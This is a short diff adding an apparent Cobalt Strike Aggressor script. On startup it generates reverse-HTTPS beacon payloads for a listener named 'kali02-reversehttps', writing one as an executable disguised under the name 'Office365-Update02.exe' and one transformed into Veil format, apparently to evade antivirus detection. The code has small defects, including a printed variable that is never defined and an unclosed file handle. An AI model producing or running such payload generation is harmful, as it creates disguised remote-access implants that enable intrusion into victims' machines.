@@ -1,0 +1,14 @@
+on ready { 
+		$data = artifact_payload("kali02-reversehttps", "exe", "x86");
+		$handle = openf(">/root/cobaltstrike/payloads/Office365-Update02.exe");
+		println($lhandle)
+		writeb($handle, $data);
+		closef($handle);
+}
+
+on ready { 
+		$data = artifact_payload("kali02-reversehttps", "raw", "x86");
+		$handle = openf(">/root/cobaltstrike/payloads/veil-payload1.txt");
+		println($lhandle);
+		writeb($handle, transform($data, "veil"));
+}
